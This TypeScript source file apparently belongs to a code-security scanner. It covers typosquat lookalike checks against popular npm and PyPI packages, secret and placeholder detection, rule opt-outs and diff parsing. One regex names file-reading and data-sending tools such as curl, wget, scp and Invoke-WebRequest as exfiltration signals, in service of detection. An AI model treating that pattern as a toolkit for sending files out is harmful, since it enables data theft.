const POPULAR_NPM = new Set(["react", "react-dom", "express", "lodash", "axios", "chalk", "commander", "request", "moment", "debug", "typescript", "webpack", "eslint", "prettier", "jest", "mocha", "vue", "angular", "jquery", "underscore", "async", "bluebird", "uuid", "dotenv", "cors", "body-parser", "mongoose", "sequelize", "socket.io", "nodemon", "yargs", "inquirer", "colors", "redis", "mysql", "mysql2", "jsonwebtoken", "bcrypt", "bcryptjs", "multer", "passport", "cheerio", "puppeteer", "electron", "rxjs", "tslib", "classnames", "prop-types", "styled-components", "tailwindcss", "vite", "rollup", "esbuild", "glob", "minimist", "semver", "fs-extra", "node-fetch", "cross-env", "rimraf", "mkdirp", "crypto-js", "discord.js", "ethers", "web3", "next", "nuxt", "svelte", "zod", "dayjs", "date-fns", "graphql", "apollo-server", "playwright", "cypress", "sharp", "nodemailer", "winston", "morgan", "helmet", "chokidar", "ioredis", "knex", "prisma", "openai", "stripe", "firebase", "aws-sdk", "pg", "ws"]);
const POPULAR_PYPI = new Set(["requests", "numpy", "pandas", "django", "flask", "urllib3", "setuptools", "boto3", "botocore", "scipy", "matplotlib", "pillow", "cryptography", "pyyaml", "beautifulsoup4", "selenium", "tensorflow", "torch", "scikit-learn", "colorama", "python-dateutil", "jinja2", "sqlalchemy", "pytest", "fastapi", "uvicorn", "pydantic", "httpx", "aiohttp", "openai", "anthropic", "transformers", "psycopg2", "pymongo", "redis", "celery", "gunicorn", "paramiko", "pycryptodome", "openpyxl", "lxml", "click", "tqdm", "rich", "certifi", "idna", "six", "wheel", "pip", "docker", "kubernetes", "streamlit"]);

// Real, well-known packages that happen to be one letter from a popular one.
const REAL_NEIGHBOURS = new Set(["preact", "color", "uid", "boto", "nest", "vuex", "rxjs", "jsdom", "pino", "ky", "got", "yaml", "axe", "chai", "sinon", "redux", "ioredis", "execa", "globby", "lxml", "httpie", "attrs", "black", "mypy", "pytz", "tomli", "toml", "jsonschema", "esbuild-wasm", "vitest"]);

/** Line numbers (0-based) inside the dependency sections of a package.json. */
function dependencyLines(lines: string[]) {
  const inside = new Set<number>();
  let depth = 0, open = false;
  lines.forEach((line, i) => {
    if (!open && /"(?:dependencies|devDependencies|peerDependencies|optionalDependencies|overrides|resolutions)"\s*:\s*\{/.test(line)) { open = true; depth = 0; }
    if (!open) return;
    for (const c of line) { if (c === "{") depth++; else if (c === "}") depth--; }
    inside.add(i);
    if (depth <= 0) open = false;
  });
  return inside;
}

/** The package name declared on a line of package.json (inside a dependencies block) or a Python requirements file. */
function dependencyName(line: string, path: string): string | undefined {
  if (/package\.json$/i.test(path)) {
    const m = /^\s*"(@?[a-z0-9][\w.-]*(?:\/[\w.-]+)?)"\s*:\s*"[~^<>=*\d xX.|-]+[\w.-]*"\s*,?\s*$/i.exec(line);
    // Skip the package's own fields such as "version": "1.0.0".
    return m && !["version", "node", "npm", "vscode", "name", "license", "main", "types"].includes(m[1]) ? m[1] : undefined;
  }
  const m = /^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(?:[=<>!~]=?|;|$|#)/.exec(line);
  return m && !line.trim().startsWith("-") ? m[1] : undefined;
}

/** Levenshtein distance, with a swap of two neighbouring letters counted as one edit. */
export function editDistance(a: string, b: string): number {
  const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]);
  for (let j = 1; j <= b.length; j++) d[0][j] = j;
  for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) {
    d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    if (i > 1 && j > 1 && a[i - 1] === b[j - 2] && a[i - 2] === b[j - 1]) d[i][j] = Math.min(d[i][j], d[i - 2][j - 2] + 1);
  }
  return d[a.length][b.length];
}

// Reading, copying or sending a file, in the common languages.
const READS = /\b(?:readFile\w*|readSync|createReadStream|read_to_string|read_text|read_bytes|open\s*\(|fopen|file_get_contents|File\.Read\w*|Get-Content|gc\s|cat\s|type\s|copyFile\w*|copy\s*\(|shutil\.copy\w*|cp\s|scp\s|upload\w*|send\w*|post\s*\(|fetch\s*\(|request\s*\(|axios|requests\.|urllib|zip\w*|tar\s|base64|exfil\w*|Compress-Archive|Invoke-WebRequest|iwr\s|curl\s|wget\s|ReadAll\w*|ioutil\.ReadFile|os\.ReadFile|Files\.read\w*|readlines?)\b/i;
// Sample values in docs and tests: AWS's documented example key, x-ed or repeated placeholders.
const FAKE_SECRET = /EXAMPLE|example|sample|dummy|fake|placeholder|your[_-]?(?:key|token)|x{6,}|X{6,}|0{8,}|(?:1234|abcd){2,}|(.)\1{9,}/;
/** Shannon entropy in bits per character: real keys are random (about 4+), placeholders are not. */
function entropy(s: string) {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0; for (const n of counts.values()) { const p = n / s.length; h -= p * Math.log2(p); }
  return h;
}

/** Longest run of consecutive characters like "abcdef" or "987654": samples are typed that way, real keys never are. */
function longestRun(s: string) {
  let best = 1, up = 1, down = 1;
  for (let i = 1; i < s.length; i++) {
    const d = s.charCodeAt(i) - s.charCodeAt(i - 1);
    up = d === 1 ? up + 1 : 1; down = d === -1 ? down + 1 : 1;
    best = Math.max(best, up, down);
  }
  return best;
}

function truncate(s: string, n: number) { const v = visible(s.trim()); return v.length > n ? v.slice(0, n - 1) + "…" : v; }

/** Blank out string literals and comments so identifier checks only see code. Keeps column positions. */
export function stripStringsAndComments(line: string): string {
  return line
    // The two alternatives never overlap (an escape vs. any other character), so this can't backtrack badly.
    .replace(/(["'`])(?:\\.|(?!\1)[^\\])*\1/g, s => " ".repeat(s.length))
    .replace(/(\/\/|#(?!!)|--\s).*$/, s => " ".repeat(s.length))
    .replace(/\/\*.*?\*\//g, s => " ".repeat(s.length));
}

/** Lines can opt out with a comment: `veyra-guard-ignore` (all rules) or `veyra-guard-ignore: rule-id, rule-id`. */
function ignoredRules(line: string): Set<string> | "all" | undefined {
  const m = /veyra-guard-ignore(?::\s*([\w,\s-]+))?/.exec(line);
  if (!m) return undefined;
  return m[1] ? new Set(m[1].split(/[\s,]+/).filter(Boolean)) : "all";
}

export interface ScanOptions {
  /** Rule ids to skip. */
  disabled?: Iterable<string>;
  /** Only report these lines (1-based), e.g. the lines a pull request added. */
  onlyLines?: Set<number>;
  /** Lowest severity to report. */
  minSeverity?: Severity;
}

/** Scan one file. `path` uses forward slashes and is used to pick which rules apply. */
export function scan(text: string, path: string, options: ScanOptions = {}): Finding[] {
  const file = path.replace(/\\/g, "/");
  if (text.length > 5_000_000 || isBinary(text)) return [];
  const lines = text.split(/\r\n|\r|\n/);
  // A file can opt out entirely (test fixtures full of sample attacks) with a comment in its first five lines.
  if (lines.slice(0, 5).some(l => /veyra-guard-ignore-file/.test(l))) return options.onlyLines ? scanOptOutsOnly(lines, options.onlyLines) : [];
  const disabled = new Set(options.disabled ?? []);
  const min = severityRank(options.minSeverity ?? "low");
  const findings: Finding[] = [];
  const add = (rule: Rule, line: number, column: number, length: number, message: string, matched: string) => {
    if (options.onlyLines && !options.onlyLines.has(line)) return;
    const own = ignoredRules(lines[line - 1] ?? ""), prev = ignoredRules(lines[line - 2] ?? "");
    for (const ig of [own, prev]) if (ig === "all" || ig?.has(rule.id)) return;
    findings.push({ rule: rule.id, title: rule.title, severity: rule.severity, line, column, endColumn: column + Math.max(1, length), message, why: rule.why, fix: FIXES[rule.id] ?? "", snippet: visible(matched).slice(0, 200) });
  };
  for (const rule of RULES) {
    if (disabled.has(rule.id) || severityRank(rule.severity) < min) continue;
    if (rule.files && !rule.files.test(file)) continue;
    if (rule.skipFiles && rule.skipFiles.test(file)) continue;
    // Documentation isn't run, and often describes attacks: there only hidden characters and leaked keys matter.
    if (DOCS.test(file) && !/(^|\/)requirements[\w.-]*\.txt$/i.test(file) && rule.id !== "trojan-source" && rule.id !== "secret") continue;
    if (rule.check) {
      for (const f of rule.check(lines, file)) add(rule, f.line, f.column, f.length, f.message, (lines[f.line - 1] ?? "").substr(f.column - 1, f.length));
      continue;
    }
    const re = new RegExp(rule.pattern!.source, rule.pattern!.flags.includes("g") ? rule.pattern!.flags : rule.pattern!.flags + "g");
    lines.forEach((line, i) => {
      if (line.length > 20_000) return; // generated or minified, not hand-written code
      re.lastIndex = 0;
      // One finding per rule per line is enough: the first match that passes the rule's extra test.
      for (let m = re.exec(line); m; m = re.exec(line)) {
        if (!rule.accept || rule.accept(m[0], lines, i)) { add(rule, i + 1, m.index + 1, m[0].length, rule.message ? rule.message(m[0]) : rule.title, m[0]); break; }
        if (m[0].length === 0) re.lastIndex++;
      }
    });
  }
  // Opt-outs are a way to hide code too: when only new lines are checked (a pull request), report any opt-out it adds.
  if (options.onlyLines && !disabled.has("guard-opt-out")) {
    lines.forEach((line, i) => {
      const at = line.search(/veyra-guard-ignore/);
      if (at >= 0 && options.onlyLines!.has(i + 1)) findings.push({ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium", line: i + 1, column: at + 1, endColumn: at + 1 + (/veyra-guard-ignore[\w:,\s-]*/.exec(line.slice(at))?.[0].trimEnd().length ?? 18), message: `This change tells Code Guard to skip ${/veyra-guard-ignore-file/.test(line) ? "this whole file" : "a line"}. Make sure that's intended.`, why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"], snippet: visible(line.trim()).slice(0, 200) });
    });
  }
  return findings.sort((a, b) => a.line - b.line || severityRank(b.severity) - severityRank(a.severity));
}

const GUARD_OPT_OUT_WHY = "An attacker who hides malicious code can also add an opt-out comment to stop it being flagged. A reviewer should confirm each opt-out is for a genuine, reviewed reason.";

function scanOptOutsOnly(lines: string[], only: Set<number>): Finding[] {
  return lines.flatMap((line, i) => {
    const at = line.search(/veyra-guard-ignore/);
    return at >= 0 && only.has(i + 1) ? [{ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium" as Severity, line: i + 1, column: at + 1, endColumn: at + 1 + 24, message: "This change tells Code Guard to skip this whole file. Make sure that's intended.", why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"], snippet: visible(line.trim()).slice(0, 200) }] : [];
  });
}

function isBinary(text: string) { const head = text.slice(0, 8000); return head.includes("\u0000") || (head.match(/[\u0001-\u0008\u000e-\u001a]/g)?.length ?? 0) > 10; }

/** Which rules exist, for settings and documentation. */
export const ruleList = () => [
  ...RULES.map(r => ({ id: r.id, title: r.title, severity: r.severity, why: r.why, fix: FIXES[r.id] ?? "" })),
  { id: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium" as Severity, why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"] },
];

/** Parse a unified diff patch (as GitHub returns per file) into the new-file line numbers it adds. */
export function addedLines(patch: string): Set<number> {
  const added = new Set<number>();
  let line = 0;
  for (const row of patch.split("\n")) {
    const hunk = /^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(row);
    if (hunk) { line = Number(hunk[1]); continue; }
    if (row.startsWith("+") && !row.startsWith("+++")) { added.add(line); line++; }
    else if (row.startsWith("-") && !row.startsWith("---")) { /* removed: no new line */ }
    else if (!row.startsWith("\\")) line++;
  }
  return added;
}

export function summarize(findings: Finding[]) {
  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const f of findings) counts[f.severity]++;
  return counts;
}
